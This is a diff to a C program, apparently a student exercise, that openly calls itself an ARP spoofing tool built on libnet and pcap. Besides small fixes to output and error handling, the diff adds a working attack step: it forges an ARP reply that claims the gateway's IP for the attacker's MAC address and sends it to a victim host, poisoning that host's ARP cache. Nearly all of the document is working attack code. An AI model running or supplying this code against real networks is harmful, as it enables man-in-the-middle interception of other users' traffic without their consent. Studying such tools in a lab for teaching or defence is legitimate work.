@@ -16,7 +16,7 @@ void print_dotip4(u_int32_t ipaddr){
 	for (int i=0; i<4; i++){
 		octet[i] = (ipaddr >> (8*i)) & 0xFF;
 	}
-	printf("%d.%d.%d.%d\n", octet[3], octet[2], octet[1], octet[0]);
+	printf("%d.%d.%d.%d\n", octet[0], octet[1], octet[2], octet[3]);
 }
 
 void callback(u_char *useless, const struct pcap_pkthdr* pkthdr, const u_char* packet){
@@ -73,7 +73,9 @@ int main(int argc, char *argv[]){
 	u_char gateway_mac[6];
 	u_char victim_mac[6];
 	u_char broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-	
+	int count = 0;
+	int fail = 0;
+
 	//check sudo or not
 	if (geteuid() != 0) {
 		fprintf(stderr, "err: you must be root to run this\n");
@@ -113,56 +115,37 @@ int main(int argc, char *argv[]){
 	}
 	else{
 		//get ip address
-		printf("Hello. This is arp spoofing program\n");
+		printf("Hello. This is arp spoofing program\n\n");
 		my_ip = libnet_get_ipaddr4(l);
 		my_mac = libnet_get_hwaddr(l);
 	}
 	printf("Your IP address is ");
 	print_dotip4(my_ip);
-	
-	//get gateway's IP address
+
 	getifaddrs (&ifap);
 	for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
 		string temp;
 		temp = ifa->ifa_name;
-		if (ifa->ifa_addr->sa_family==AF_INET && temp=="eth0") {
+		if (ifa->ifa_addr&&ifa->ifa_addr->sa_family==AF_INET && temp==dev) {
 			sa = (struct sockaddr_in *) ifa->ifa_addr;
 			gtaddr = inet_ntoa(sa->sin_addr);
+			printf("Interface: %s\tAddress: %s\n", ifa->ifa_name,gtaddr);
 		}
 	}
+
 	printf("Interface IP address is %s\n",gtaddr);
 	gateway_ip = inet_addr(gtaddr);
 	freeifaddrs(ifap);
 
-
 	//get victim's IP address
-	printf("Victim IP address(XXX.XXX.XXX.XXX form) : ");
+	printf("Victim's IP address(XXX.XXX.XXX.XXX form) : ");
 	char str[] = ""; //temp str to store data
 	scanf("%s", str);
 	victim_ip = inet_addr(str);
 	
-	printf("Making arp packet.......\n");
+	printf("\nMaking arp packet.......\n");
 
 	//make arp packet
-	/*
-	autobuild -> op,sha,spa,tha,tpa,l
-	libnet_build_arp ->
-		hrd: ARPHRD_ETHER
-		pro: ETHERTYPE_IP
-		hln: 6
-		pln: 4
-		op: ARPOP_REQUEST
-		sha:
-		spa:
-		tha:
-		tpa:
-		payload: NULL
-		payload_s: 0
-		l: l
-		ptag: 0  
-	*/
-
-
 	t = libnet_autobuild_arp(ARPOP_REQUEST, //op
 	my_mac->ether_addr_octet,//sha
 	(u_int8_t *)&my_ip,//spa
@@ -194,13 +177,18 @@ int main(int argc, char *argv[]){
 	}
 	
 	//send
-	printf("Sending arp packet....\n");
+	printf("Sending arp packet..........\n");
 	int c = libnet_write(l);
 
-	printf("Wating arp reply packet....\n");
+	if(c==-1){
+		fprintf(stderr, "Write error:%s\n", libnet_geterror(l));
+		return 2;
+	}
+	printf("\nWaiting arp reply packet......\n");
 
-	int count = 0;
+	
 	while(pcap_next_ex(handle, &header, &packetrep) >= 0){
+
 		count = count+1;
 		/* ethernet,ip,tcp header */
 		libnet_ethernet_hdr* eth_hdr;
@@ -210,16 +198,16 @@ int main(int argc, char *argv[]){
 		eth_hdr = (struct libnet_ethernet_hdr *) (packetrep);
 		printf("%d's packet read\n", count);
 
+		//sometimes anormal situation generated. i don't know why
 		/* arp check*/
 		if(ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP){
 			/* get arp_hdr */
 			arp_hdr = (struct libnet_arp_hdr *) (packetrep + sizeof(struct libnet_ethernet_hdr));
-
 			if(arp_hdr->ar_op == 0x0200){
 				data = ((u_char*)arp_hdr);
 
-				for(int i=0; i<20;i++){
-					if (i>7 && i<14){
+				for(int i=0; i<14;i++){
+					if (i>7){
 						printf("%02X:", *data);
 						victim_mac[i-8] = *data;	
 					}
@@ -228,43 +216,85 @@ int main(int argc, char *argv[]){
 				break;
 			}
 		}
+		
 		if(count > 10){
-			printf("Fail to find reply packet\n");
+			printf("Fail to find reply packet.\nMaybe victim's IP is not exist.\n");
+			fail = 1;
 			break;
 		}		
 	}
-
-	if(c==-1){
-		fprintf(stderr, "Write error:%s\n", libnet_geterror(l));
-		return 2;
-	}
-
 	libnet_destroy(l);
 	pcap_close(handle);
 
-/////////////////////////////////////////////////////////////////////
-//////////////////suppose that fail to get mac address via arp/////
-////////////////////////////////////////////////////////////////////
 
-
-	printf("fail to get mac address..\n");
-	printf("Victim's mac address(XX:XX:XX:XX:XX:XX) : ");
-	//scanf("%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &victim_mac[5], &victim_mac[4], &victim_mac[3], &victim_mac[2], &victim_mac[1], &victim_mac[0]);
-
-	printf("We are going to send arp spoofing packet.\n");
-	printf("Gateway's ip address is :");
-	print_dotip4(gateway_ip);
-	printf("Victim's ip address is :");
-	print_dotip4(victim_ip);
-	printf("Victim's mac address is : ");
-
-	for (int i=0;i<6;i++){
-		printf("%02X", victim_mac[i]);
-		if(i<5)
-			printf(":");
+	if(fail == 0){
+		printf("We are going to send arp spoofing packet.\n");
+		printf("Gateway's ip address is :");
+		print_dotip4(gateway_ip);
+		printf("Victim's ip address is :");
+		print_dotip4(victim_ip);
+		printf("Victim's mac address is : ");
+		for (int i=0;i<6;i++){
+			printf("%02X", victim_mac[i]);
+			if(i<5)
+				printf(":");
+		}
+		printf("\nSending...\n");
+	
+		//send spoof arp
+		l = libnet_init(LIBNET_LINK_ADV, dev, errbuf);
+	
+		if(l==NULL){
+				fprintf(stderr, "%s", errbuf);
+			return 2;
+		}
+	
+		t = libnet_build_arp(ARPHRD_ETHER, //hrd
+			ETHERTYPE_IP,//pro
+			6,	//hln
+			4,	//pln
+			ARPOP_REPLY,	//op
+			my_mac->ether_addr_octet,//sha
+			(u_int8_t *)&gateway_ip,//spa
+			victim_mac,//tha
+			(u_int8_t *)&victim_ip,//tpa
+			NULL,//payload
+			0,//payload_s
+			l,//l
+			0);//patag
+		
+		//attach ethernet
+			t = libnet_autobuild_ethernet(victim_mac,//dest
+			ETHERTYPE_ARP,//p
+			l);
+		
+		c = libnet_write(l);
+	
+		if(c==-1){
+			fprintf(stderr, "Write error:%s\n", libnet_geterror(l));
+				return 2;
+		}else{
+			printf("All done. close the program.\n");
+		}
+	
+		libnet_destroy(l);
+		/*
+		autobuild -> op,sha,spa,tha,tpa,l
+		libnet_build_arp ->
+			hrd: ARPHRD_ETHER
+			pro: ETHERTYPE_IP
+			hln: 6
+			pln: 4
+			op: ARPOP_REQUEST
+			sha:
+			spa:
+			tha:
+			tpa:
+			payload: NULL
+			payload_s: 0
+			l: l
+			ptag: 0  
+		*/
 	}
-	printf("\n");
-
-
 	return 0;
-}
+}		
